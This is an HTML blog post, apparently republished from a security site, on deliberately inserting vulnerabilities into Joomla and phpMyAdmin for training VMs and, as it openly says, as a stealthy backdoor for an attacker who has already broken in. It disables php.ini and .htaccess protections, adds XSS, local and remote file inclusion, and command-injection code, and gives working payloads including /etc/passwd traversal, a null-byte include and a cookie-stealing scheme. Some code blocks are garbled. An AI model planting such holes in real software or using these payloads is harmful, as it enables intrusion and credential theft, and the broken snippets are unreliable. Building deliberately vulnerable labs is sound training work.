@@ -1,0 +1,476 @@
+<!DOCTYPE html>
+<html class="direction--ltr"lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Inserting Vulnerabilities in Web Applications | Prateekg147</title>
+<meta name="generator" content="Jekyll v4.2.2" />
+<meta property="og:title" content="Inserting Vulnerabilities in Web Applications" />
+<meta name="author" content="Prateek Gianchandani" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="In this article we will look at how we can insert vulnerabilities in web applications. Why? There are basically two reasons. Firstly, because it allows us to see the application from the eyes of a web developer and not a hacker. Secondly, because it allows us to create a platform where we can create a set of vulnerable web applications, and fuse them all together in a Virtual machine. So now, several people can test their web application security skills on the VM and learn from it. Some of the other reasons might be to leave a backdoor onto the server once the attacker has got access. Some of the backdoors could be very easily found out as they stand apart from the rest of the applications, but if the web application itself has been made vulnerable instead, then its a bit tough to detect it." />
+<meta property="og:description" content="In this article we will look at how we can insert vulnerabilities in web applications. Why? There are basically two reasons. Firstly, because it allows us to see the application from the eyes of a web developer and not a hacker. Secondly, because it allows us to create a platform where we can create a set of vulnerable web applications, and fuse them all together in a Virtual machine. So now, several people can test their web application security skills on the VM and learn from it. Some of the other reasons might be to leave a backdoor onto the server once the attacker has got access. Some of the backdoors could be very easily found out as they stand apart from the rest of the applications, but if the web application itself has been made vulnerable instead, then its a bit tough to detect it." />
+<meta property="og:site_name" content="Prateekg147" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2013-06-13T20:43:00+00:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Inserting Vulnerabilities in Web Applications" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Prateek Gianchandani"},"dateModified":"2013-06-13T20:43:00+00:00","datePublished":"2013-06-13T20:43:00+00:00","description":"In this article we will look at how we can insert vulnerabilities in web applications. Why? There are basically two reasons. Firstly, because it allows us to see the application from the eyes of a web developer and not a hacker. Secondly, because it allows us to create a platform where we can create a set of vulnerable web applications, and fuse them all together in a Virtual machine. So now, several people can test their web application security skills on the VM and learn from it. Some of the other reasons might be to leave a backdoor onto the server once the attacker has got access. Some of the backdoors could be very easily found out as they stand apart from the rest of the applications, but if the web application itself has been made vulnerable instead, then its a bit tough to detect it.","headline":"Inserting Vulnerabilities in Web Applications","mainEntityOfPage":{"@type":"WebPage","@id":"/2013/06/13/inserting-vulnerabilities-in-web-applications.html"},"url":"/2013/06/13/inserting-vulnerabilities-in-web-applications.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/css/style.css">
+  <link rel="icon" type="image/png" href="/assets/favicon.png" />
+  <link rel="stylesheet" href="/assets/css/magnific-popup.css"><link type="application/atom+xml" rel="alternate" href="/feed.xml" title="Prateekg147" /><script src="https://code.jquery.com/jquery-3.2.0.min.js"></script> 
+  <script src="/assets/js/jquery.magnific-popup.js"></script>
+</head>
+<body><div class="site-header">
+  <div class="wrapper">
+    <a class="site-title" rel="author" href="/">Blogs<b class="command_prompt"></b></a>
+    <a class="site-title" rel="author" href="/about">About<b class="command_prompt"></b><b class="blinking_cursor">_</b></a>
+    <span class="social_links">
+        
+        
+        <a class="color-cyan-hover" href="https://twitter.com/prateekg147"><i class="fab fa-twitter-square"></i></a>
+        
+        
+        
+        <a class="color-indigo-hover" href="https://www.linkedin.com/in/prateekgianchandani/"><i class="fab fa-linkedin"></i></a>
+        
+        
+        
+        <a class="color-yellow-hover" href="https://github.com/prateek147"><i class="fab fa-github-square"></i></a>
+        
+        
+    </span>
+  </div>
+</div>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        
+  <div class="author-box">
+
+
+<img src="
+    https://pbs.twimg.com/profile_images/1244561732170899457/SRr3p2iV_400x400.jpg
+" class="author-avatar" alt="Avatar" />
+<div class="description">I am Prateek Gianchandani. Currently i am working as a Security Researcher in UAE.  I have interests in Exploit Development, Mobile and Browser Security....<a href="/about"> Continue</a>
+</div>
+
+</div>
+
+
+<div class="post">
+  <h1 class="post-title">Inserting Vulnerabilities in Web Applications</h1>
+  
+  <div class="post-tags">
+      
+      <a class="tag" href="/tag/web-application-security/">web-application-security</a>
+      
+      <a class="tag" href="/tag/security/">security</a>
+      
+  </div>
+  
+  <div class="post-date">
+    Published on 13 Jun 2013
+    
+  </div>
+  
+  <p>In this article we will look at how we can insert vulnerabilities in web applications. Why? There are basically two reasons. Firstly, because it allows us to see the application from the eyes of a web developer and not a hacker. Secondly, because it allows us to create a platform where we can create a set of vulnerable web applications, and fuse them all together in a Virtual machine. So now, several people can test their web application security skills on the VM and learn from it. Some of the other reasons might be to leave a backdoor onto the server once the attacker has got access. Some of the backdoors could be very easily found out as they stand apart from the rest of the applications, but if the web application itself has been made vulnerable instead, then its a bit tough to detect it.</p>
+
+<!--more-->
+
+<p>In this article we will be looking at some of the Open Source Web Applications, for e.g Joomla, phpMyAdmin etc, see what mechanisms the developers use to protect these application from OWASP Top 10 Web Application Vulnerabilities, and then look at how we can change the code to make the application vulnerable.</p>
+
+<p>The first and foremost thing to do is to change some of the configurations in the <em>php.ini</em> file of your server. There are some configurations in this file that may protect the web application from being exploited. In my case the php.ini was located in the location <em>/etc/php.ini</em>. In your case it might be different. Instead of changing the configuration of your main <em>php.ini</em> file, you can instead make a custom <em>php.ini</em> file in your web application which could overwrite the settings in the main <em>php.ini</em> file, though this may not work all the time. Hence we will go with editing the main <em>php.ini</em> file. Open up your <em>php.ini</em> file and make sure the following settings match with your php.ini file.</p>
+
+<pre>safe_mode = Off</pre>
+
+<p>The safe mode is used to prevent your server from getting exploited by blocking some of the dangerous functions like shell execution in php etc. According to <a href="http://php.net">php.net</a>, this feature has been DEPRECATED as of PHP 5.3.0.</p>
+
+<pre>register_globals = On</pre>
+
+<p>This setting allows the modification of global variables from the URL. For e.g if the url is <em>http://infosecinstitute.com?q=infosec</em> then this means that the value of “q” can be changed depending upon the URL (in this case it is “infosec”). In case of a different url say <em>http://infosecinstitute.com?q=test</em>, the value of q will be “test”. Hence it can be modified by just changing the URL. We will see later how this helps us while inserting File Inclusion vulnerabilities.</p>
+
+<pre>allow_url_fopen = On</pre>
+
+<p>This options allows the treatment of URL’s as files.</p>
+
+<pre>allow_url_include = On</pre>
+
+<p>This option uses the function include, include_once, require, require_once to open URL’s as files.</p>
+
+<pre>magic_quotes_gpc = Off</pre>
+
+<p>This disables the feature of php where it tries to escape any malicious characters which might corrupt the data or might perform an injection attack.</p>
+
+<pre>file_uploads = On</pre>
+
+<p>This allows the use of HTTP file uploads</p>
+
+<pre>display_errors = On</pre>
+
+<p>This feature allows the server to display errors. Though this might be a useful setting while development but it should not be set to ON once the web application is live. This is because the errors might leak sensitive information about the web application.</p>
+
+<p>Once you have made these changes, save the <em>php.ini</em> file (make sure that it is writable). Restart the server to make the changes come into effect.</p>
+
+<p><img src="/images/posts/insvul/first.png" alt="First" /></p>
+
+<p>The next step is to download Joomla, which is an open source Content Management System. Joomla can be downloaded from <a href="http://www.joomla.org/download.html">here.</a> Once it is downloaded, install in on your system and remove the installation directory. Once all of these steps are done, the Joomla home page should look like this.</p>
+
+<p><img src="/images/posts/insvul/1.png" alt="1" /></p>
+
+<p>Let’s go the Joomla directory and analyze the code. The joomla directory has a .htaccess file. Let’s see what are the configurations in it. Open up the .htaccess file .</p>
+
+<p><img src="/images/posts/insvul/2.png" alt="2" /></p>
+
+<p>As we can see that their is a lot of interesting stuff here. Let’s analyze them one by one.</p>
+
+<p><img src="/images/posts/insvul/3.png" alt="3" /></p>
+
+<p>This code is used to stop someone from using base64 encoding to perform attacks like script execution, login bypass etc.</p>
+
+<p><img src="/images/posts/insvul/4.png" alt="3" /></p>
+
+<p>Protection against Cross Site Scripting.</p>
+
+<p><img src="/images/posts/insvul/5.png" alt="5" /></p>
+
+<p>Protection against various types of Inclusion attacks like Local file inclusion and Remote file inclusion</p>
+
+<p><img src="/images/posts/insvul/6.png" alt="6" /></p>
+
+<p>Protection against File Inclusion attacks like Local file inclusion and Remote file inclusion and also SQL Injection to some extent. This is because the attacker might modify the parameters sent via GET or POST Request.</p>
+
+<p><img src="/images/posts/insvul/7.png" alt="7" /></p>
+
+<p>In case the user tries to browse somewhere he doesn’t have access to.</p>
+
+<p>Now we know what to do. In order to insert vulnerablities into Joomla, these rules should not be there. Comment out these rules so that the file appears like this.</p>
+
+<p><img src="/images/posts/insvul/8.png" alt="8" /></p>
+
+<p><strong>1) Inserting Reflected XSS (Cross Site Scripting)</strong></p>
+
+<p>Let’s say we add the following code to index.php file in Joomla</p>
+
+<p><code class="language-plaintext highlighter-rouge">php $name = $_GET['name']; if(isset($name)) { print "Welcome, ".$name; } else { print "Welcome, User "; }</code></p>
+
+<p>The Joomla main page takes a name parameter in it’s url and displays a welcome message at the top of the main page as shown in the figure below.</p>
+
+<p><img src="/images/posts/insvul/9.png" alt="9" /></p>
+
+<p>We are right now not sure if the application is vulnerable to Cross Site Scripting, but we know that there is a possibility because the parameter we pass in the url is displayed in the main page without validating it. We also removed the checks for the <em>script</em> tag previously. Hence if we input some script as the parameter and it gets executed, then we know that it is definitely a vulnerability.</p>
+
+<p>Let’s enter the following url in the input</p>
+
+<pre>http://127.0.0.1/Joomla/index.php?name=%3Cscript%3Ealert%28%22This%20is%20definitely%20a%20vulnerability%22%29;%3C/script%3E</pre>
+
+<p><img src="/images/posts/insvul/10.png" alt="10" /></p>
+
+<p>The script gets executed and we are shown an alert. Hence we can confirm that we just inserted a XSS vulnerability in the application.</p>
+
+<p><strong>2) Inserting LFI (Local File Inclusion) and RFI (Remote File Inclusion)</strong></p>
+
+<p>Local file inclusion occur when it is possible to include a file on the server from the URL and see the content inside it. In this case, we will be inserting an LFI vulnerability in Joomla.</p>
+
+<p>Joomla allows us to create components, in this case we will be creating a custom component. To do this just make a folder named com_COMPONENTNAME in the components folder. In this case our component name would be <em>com_infosec</em>.</p>
+
+<p><img src="/images/posts/insvul/11.png" alt="11" /></p>
+
+<p>Copy all the files from any component and rename it according to the current component, i.e infosec. Once this is done, add the following code in it’s infosec.php file.</p>
+
+<p><code class="language-plaintext highlighter-rouge">php if (isset($_REQUEST["imp_file"])){ $imp_file = $_REQUEST["imp_file"]; } require_once($imp_file);</code></p>
+
+<p>Note that we could have used the code <em>include_once</em> too. The only difference between them is that <em>include_once</em> will show an error in case the file is not found while <em>require_once</em> won’t. From the code it is very clear that the infosec.php will take a file name as the parameter and then include it in the webpage. Since it is possible to modify the request variables because of the settings we changed earlier, it is possible to include any file from the server and display it in the browser. Let’s try and display the /etc/passwd file.</p>
+
+<p>Go to the following url:</p>
+
+<pre>http://127.0.0.1/Joomla/index.php?option=com_infosec&amp;name=InfosecInstitute&amp;imp_file=../../../../../etc/passwd</pre>
+
+<p><img src="/images/posts/insvul/13.png" alt="13" /></p>
+
+<p>As we can see that we get a dump of the <em>/etc/passwd</em> file of the server. Note that the number of <em>”../”</em> might be different in your case. Hence we have successfully inserted a local file inclusion vulnerability in the web application. Please note that this is also a Remote file Inclusion vulnerability. Let’s try and load up google.com on the Joomla home page.</p>
+
+<p>Go to the following url:</p>
+
+<pre>http://127.0.0.1/Joomla/index.php?option=com_infosec&amp;name=InfosecInstitute&amp;imp_file=http://google.com</pre>
+
+<p><img src="/images/posts/insvul/14.png" alt="14" /></p>
+
+<p>We just successfully loaded a remote url on Joomla’s web page. Imagine the consequences of such a vulnerability. It is now possible to execute any remote script present anywhere on the web on the victim.</p>
+
+<p>Please note that sometimes the code which is responsible for including the file could be like this</p>
+
+<pre>include($FilePath.'.php');</pre>
+
+<p>This means that the argument is appended with “.php” and that file name is then included. In this case our previous url will not work because of the extra “.php” after it. However its effect can be nullified by adding the null byte <em>“%00”</em> after the url. This escapes all the stuff after the null byte.</p>
+
+<p>Hence in this case our url would be..</p>
+
+<pre>http://127.0.0.1/Joomla/index.php?option=com_infosec&amp;name=InfosecInstitute&amp;imp_file=http://google.com%00codeDoesntGoHere</pre>
+
+<p><strong>3) Inserting Information Disclosure vulnerability</strong></p>
+
+<p>Almost all the web applications have some sort of configuration file. In Joomla, it goes by the name <em>“configurations.php”</em> and is located in its root directory. Some developers like to keep a backup for their configuration file. The usual norm is to keep it by the extension <em>“.bak”</em>. Hence the backup file for the configuration file <em>“configurations.php”</em> would be named as “configurations.php.bak”. However their is a security issue with this. A bak file when accessed from the browser via url will prompt for a download of the file. Hence any user from outside can download the configuration file and hence see all the settings like username, password for Joomla. This needs some guess work from the attacker’s side, though it can also be done by the use of automated tools. The .bak file looks something like this.</p>
+
+<p><img src="/images/posts/insvul/config_file.png" alt="Config File" /></p>
+
+<p>As we can see, a lot of things like the Username, Password for the administrator are clearly visible in the configuration file. Disclosure of the configuration file can lead to complete compromise of the web application.</p>
+
+<p>Sometimes the admin might need to store his password or some other confidential information in a file on the server, but may not want other users to access it, so he puts it in a directory and gives it a wierd name 21lnkqasdsacnd1eqwdn22qwd2wd. To protect the directory from google and other search engines he modifies the <em>robots.txt</em> file as shown to disallow web crawlers to index that directory. But the problem is that the robots.txt file is world readable and hence the attacker can figure out the name of the directory once he browses to the <em>robots.txt</em> file. When we browse to the robots.txt file for Joomla we get something like this.</p>
+
+<p><img src="/images/posts/insvul/16.png" alt="16" /></p>
+
+<p>We now know that the admin is protecting something from the web crawlers, a folder with a weird name <em>21lnkqasdsacnd1eqwdn22qwd2wd</em>. Let’s check it out.</p>
+
+<p><img src="/images/posts/insvul/17.png" alt="17" /></p>
+
+<p>The <em>password.txt</em> file is available for anyone to view. Some developers think that the <em>robots.txt</em> file is used for hiding subdomains and directories.But in actual it is used to provide direction to web crawlers about what publicly available information should and should not be indexed. Hence if a directory is non-public, then it should not be linked anywhere on the site and it should not be included in robots.txt, because that essentially makes it public. If it is not linked, there is no reason to include it in the robots.txt in the first place.</p>
+
+<p><strong>4)Inserting CSRF (Cross Site Request Forgery) Vulnerability</strong></p>
+
+<p>CSRF occurs when an attacker is able to have the victim user make a request to a trusted site (to which he is already authenticated) on behalf of the victim without his knowledge. Some developers think that allowing the victim to submit only POST Requests or using a secret cookie will prevent the victim from CSRF. But this is not true as the cookie will be submitted with every request the victim makes to the trusted website. Also it is very trivial for the attacker to have the victim submit a POST request which can be done by having a secret form on the attacker’s website which would be submitted to the trusted website on behalf of the victim.</p>
+
+<p>There are some ways to prevent CSRF. One of them is to have a secret token and have it submitted with each request the client makes to the trusted website, either in the URL or in the header. Also this token should have a timeout value after which it should expire and a new token is generated for the user. One of the other ways is to have the authentication data submitted with important requests, for e.g wire transfer, password change etc. Note that in this case the attacker won’t have access to the user’s credentials and hence won’t be able to perform this attack. Inserting a CSRF is hence quite easy. We just need to remove all the checks that prevent CSRF, i.e remove the checking of tokens, authentication data etc. More information about CSRF can be found <a href="http://en.wikipedia.org/wiki/Cross-site_request_forgery">here</a>.</p>
+
+<p>For inserting the next two vulnerabilities we are going to use the web application <em>phpMyAdmin</em>. More information on phpMyAdmin and to know the steps to install it, click <a href="http://www.phpmyadmin.net/documentation/">here</a>.</p>
+
+<p><strong>5) Inserting Reflected XSS (Cross Site Scripting) vulnerabilities</strong></p>
+
+<p>Let’s assume for one moment that phpmyadmin is an application used by many users and it has just one admin. The admin wants to provide a functionality in a page message.html <em>http://site-IP/phpmyadmin/message.html</em> that allows any user to post a message to the administrator. The message is passed to a file message.php which writes it to a file text.html without validating the message. The admin can then view all the message by just going to the <em>text.html</em> page. So if an attacker can inject malicious code in the message field then that code would execute on the admin’s machine once the admin opens up the text.html page. This vulnerability is called Reflected XSS (Cross Site Scripting). Also, by using the same technique the attacker can steal the admin’s cookies. The attacker could use a cookie catcher located somewhere on the web which takes a variable <em>‘c’</em>. We pass the variable <em>c</em> as document.cookie (i.e the user’s cookie) to the <em>Cookie Catcher</em> file (note that we must know the location of the cookie catcher file), for e.g if the Cookie Catcher file URL is <em>http://infosecinstitute.com/cookie_catcher.php</em> then the request that we will send from the client machine through XSS is <em>http://infosecinstitute.com/cookie_catcher.php?c=USER_COOKIE</em>. The USER_COOKIE is the cookie we fetch through javascript.This file then writes the Cookie and other values to a file named <em>user_info.html</em>.</p>
+
+<p>Code for “message.html”, the message to the admin is sent from here</p>
+
+<p>``` php POST YOUR MESSAGE TO ADMIN HERE !</p>
+
+<form action="message.php" method="get"><input type="text" name="c" /></form>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+Code for "message.php", once the message is sent, this code stores the message in a file named text.html
+
+``` php IP: ' .$ip. '  
+Date and Time: ' .$date. '  
+Referer: '.$referer.'  
+
+'); fclose($fp); //Redirect the user to google.com header ("Location: http://www.google.com"); ?&gt; ```
+
+Code for "Cookie Catcher file". Note that this file should be stored somewhere on the internet, we call the url of the file with an argument "c" in which we pass the cookie. This file then takes the cookie and other information and writes all the values into a file named "user_info.html".
+
+``` php IP: ' .$ip. '  
+Date and Time: ' .$date. '  
+Referer: '.$referer.'  
+
+'); fclose($fp); //Redirect the user to google.com header ("Location: http://www.google.com"); ?&gt; ``` **5) Inserting Remote Command Execution vulnerability**
+
+Phpmyadmin comes with a footer.php file where we can write code which should appear at the bottom of every page in the application. In this case the admin allows the user to ping any server in the world by running the ping command on his server but not filtering out the input properly. So if the attacker inputs something like this _"127.0.0.1 ; ls" OR "127.0.0.1 ; cat /etc/passwd"_ he can run these commands on the remote webserver and see the output too.
+
+Here is how the footer appears in phpMyAdmin
+
+![PhpRemoteExexVuln](/images/posts/insvul/phpRemoteExexVuln.png)
+
+Once we click on submit, the output result looks like this. We can easily deduce that we now have the ability to execute remote commands on the server.
+
+![RemoteExecResult](/images/posts/insvul/remoteExecResult.png)
+
+Here is the code for the file "config.footer.inc.php"
+
+``` php
+
+# Find which server is online anywhere in the world
+
+Enter an IP address of the server below:
+
+&lt;form name="ping" action="ping.php" method="post"&gt;&lt;input type="text" name="ip" size="30"&gt; &lt;input type="submit" value="submit" name="submit"&gt;&lt;/form&gt;
+
+</code></pre></div></div>
+
+<p>Here is the code for the file “ping.php”</p>
+
+<p><code class="language-plaintext highlighter-rouge">php</code></p>
+
+<h2 id="conclusion">Conclusion</h2>
+
+<p>In this article we looked at how we can insert vulnerabilities in web applications. We took some of the popular open source applications like Joomla and phpMyAdmin as the example, learnt how it protected itself from various common exploits and then bypassed those protection mechanisms to make the application vulnerable. Inserting vulnerabilities can be useful for many reasons, a company might want to set up a test environment for it’s users to test their Web Application Security skills, or because an attacker who has already broken into the web application might want to leave a backdoor so that he can get access later. Hence, instead of leaving behind a standalone backdoor which stands apart from all the web applications on the server and could be easily detected , inserting a vulnerability in a web application is a much better option because of the stealth involved in this case.</p>
+
+<h2 id="references">References:</h2>
+
+<ul>
+  <li>
+    <p>PHP: The configuration file - Manual<br />
+http://php.net/manual/en/configuration.file.php</p>
+  </li>
+  <li>
+    <p>Cross-site_request_forgery<br />
+http://en.wikipedia.org/wiki/Cross-site_request_forgery</p>
+  </li>
+</ul>
+
+<p>This article was originally published on the <a href="http://resources.infosecinstitute.com/">resources</a> page at <a href="http://infosecinstitute.com/">Infosec Institute</a>. For more information, please visit my author <a href="http://resources.infosecinstitute.com/author/prateek/">page</a>.</p>
+
+</div>
+
+
+
+
+
+<div class="related">
+  <h2>related posts</h2>
+  <ul class="related-posts">
+    
+      <li>
+        <h3>
+          <a href="/2020/09/06/arm64-reversing-and-exploitation-part-3-a-simple-rop-chain.html">
+            ARM64 Reversing and Exploitation Part 3 - A Simple ROP Chain
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/2020/09/06/arm64-reversing-and-exploitation-part-2-use-after-free.html">
+            ARM64 Reversing and Exploitation Part 2 - Use After Free
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/2020/09/05/arm64-reversing-and-exploitation-part-1-arm-instruction-set-heap-overflow.html">
+            ARM64 Reversing and Exploitation Part 1 - ARM Instruction Set + Simple Heap Overflow
+          </a>
+        </h3>
+      </li>
+    
+  </ul>
+</div>
+
+
+
+
+  
+  <h2>all tags</h2>
+  <div class="tag-cloud"><a href="/tag/android/" class="set-1">android</a> <a href="/tag/authentication/" class="set-1">authentication</a> <a href="/tag/backtrack/" class="set-1">backtrack</a> <a href="/tag/burpsuite/" class="set-1">burpsuite</a> <a href="/tag/defcon/" class="set-1">defcon</a> <a href="/tag/dns/" class="set-1">dns</a> <a href="/tag/honeypots/" class="set-1">honeypots</a> <a href="/tag/ios/" class="set-1">ios</a> <a href="/tag/maintaining-access/" class="set-1">maintaining-access</a> <a href="/tag/meshnet/" class="set-1">meshnet</a> <a href="/tag/metasploit/" class="set-1">metasploit</a> <a href="/tag/networking/" class="set-1">networking</a> <a href="/tag/privacy/" class="set-1">privacy</a> <a href="/tag/security/" class="set-5">security</a> <a href="/tag/timing-analysis-attacks/" class="set-1">timing-analysis-attacks</a> <a href="/tag/w3af/" class="set-1">w3af</a> <a href="/tag/web-application-security/" class="set-1">web-application-security</a></div>
+  
+
+
+
+
+<script>
+  let i = 0;
+  const text = '';
+  const speed = parseInt('50');
+  
+  function typeWriter() {
+    if (i < text.length) {
+      document.getElementById('animated-post-description').innerHTML += text.charAt(i);
+      i++;
+      setTimeout(typeWriter, speed);
+    }
+  }
+
+  document.getElementById('animated-post-description').style.display = 'initial';
+  typeWriter();
+
+  // Image modal
+  var $imgs = [];
+  $('img').each(function(idx) {
+    var obj = {
+      src: $(this).attr('src')
+    }
+    $imgs.push(obj);
+    var elem = $(this);
+    $(this).click(function() {
+      $('.modal').magnificPopup('open', idx);
+    });
+  });
+
+  $('.modal').magnificPopup({
+    items: $imgs,
+    type: 'image',
+    closeOnContentClick: true,
+    mainClass: 'mfp-img-mobile',
+    image: {
+      verticalFit: true
+    }
+    
+  });
+</script>
+
+      </div>
+    </main><footer class="site-footer">
+  <div class="wrapper">
+    <div class="credits"><a href="https://github.com/bitbrain/jekyll-dash">dash</a> theme for Jekyll by <a href="https://github.com/bitbrain">bitbrain</a> made with <i class="fas fa-heart"></i><div class="toggleWrapper">
+    <input type="checkbox" class="dn" id="theme-toggle" onclick="modeSwitcher()" checked />
+    <label for="theme-toggle" class="toggle">
+    <span class="toggle__handler">
+      <span class="crater crater--1"></span>
+      <span class="crater crater--2"></span>
+      <span class="crater crater--3"></span>
+    </span>
+        <span class="star star--1"></span>
+        <span class="star star--2"></span>
+        <span class="star star--3"></span>
+        <span class="star star--4"></span>
+        <span class="star star--5"></span>
+        <span class="star star--6"></span>
+    </label>
+</div>
+<script type="text/javascript">
+const theme = localStorage.getItem('theme');
+
+if (theme === "light") {
+    document.documentElement.setAttribute('data-theme', 'light');
+} else {
+    document.documentElement.setAttribute('data-theme', 'dark');
+}
+const userPrefers = getComputedStyle(document.documentElement).getPropertyValue('content');
+
+function activateDarkTheme() {
+    document.getElementById('theme-toggle').checked = true;
+    document.documentElement.setAttribute('data-theme', 'dark');
+    document.documentElement.classList.add('theme--dark');
+    document.documentElement.classList.remove('theme--light');
+	document.getElementById("theme-toggle").className = 'light';
+	window.localStorage.setItem('theme', 'dark');
+}
+
+function activateLightTheme() {
+    document.getElementById('theme-toggle').checked = false;
+    document.documentElement.setAttribute('data-theme', 'light');
+    document.documentElement.classList.add('theme--light');
+    document.documentElement.classList.remove('theme--dark');
+	document.getElementById("theme-toggle").className = 'dark';
+	window.localStorage.setItem('theme', 'light');
+}
+
+if (theme === "dark") {
+    activateDarkTheme();
+} else if (theme === "light") {
+    activateLightTheme();
+} else if  (userPrefers === "light") {
+    activateDarkTheme();
+} else {
+    activateDarkTheme();
+}
+
+function modeSwitcher() {
+	let currentMode = document.documentElement.getAttribute('data-theme');
+	if (currentMode === "dark") {
+	    activateLightTheme();
+	} else {
+	    activateDarkTheme();
+	}
+}
+</script></div>
+  </div>
+</footer>
+
+
+<script>
+      window.FontAwesomeConfig = {
+        searchPseudoElements: true
+      }
+    </script>
+  </body>
+
+</html>
